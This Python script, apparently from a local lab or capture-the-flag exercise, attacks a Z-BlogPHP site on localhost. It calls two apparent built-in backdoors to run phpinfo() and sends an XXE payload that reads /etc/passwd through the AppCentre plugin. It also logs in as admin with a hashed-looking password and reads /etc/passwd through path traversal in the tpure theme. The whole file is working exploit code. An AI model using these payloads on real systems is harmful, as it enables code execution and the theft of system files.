import requests

def zi_dai_hou_men_1():
	url = "http://127.0.0.1:8079/zb_system/cmd.php?act=phpinfo();"
	print(requests.get(url).text)

def zi_dai_hou_men_2():
	url = "http://127.0.0.1:8079/index.php"
	data = {'a':'phpinfo();'}
	print(requests.post(url,data).text)

def xxe():
	url = "http://127.0.0.1:8079//zb_users/plugin/AppCentre/submit.php"
	payload = '''<?xml version = "1.0"?>
<!DOCTYPE ANY [
<!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
'''
	print(requests.post(url=url,data=payload,headers={'Content-Type':'application/xml'}).text)

def wen_jian_du_qu():
	s = requests.session()
	login_url = "http://127.0.0.1/zb_system/cmd.php?act=verify"
	login_data = {
	'btnPost':'%E7%99%BB%E5%BD%95',
	'username':'admin',
	'password':'25d55ad283aa400af464c76d713c07ad',
	'savedate':'1'
	}
	login = s.post(login_url,login_data)
	#print(login.text)
	url = "http://127.0.0.1:8079/zb_users/theme/tpure/main.php?act=color&css=../../../../../../etc/passwd"
	data = {
	"PostCOLORON":'1'
	}
	print(s.post(url,data).text)

#zi_dai_hou_men_1()
#zi_dai_hou_men_2()
#xxe()
#wen_jian_du_qu()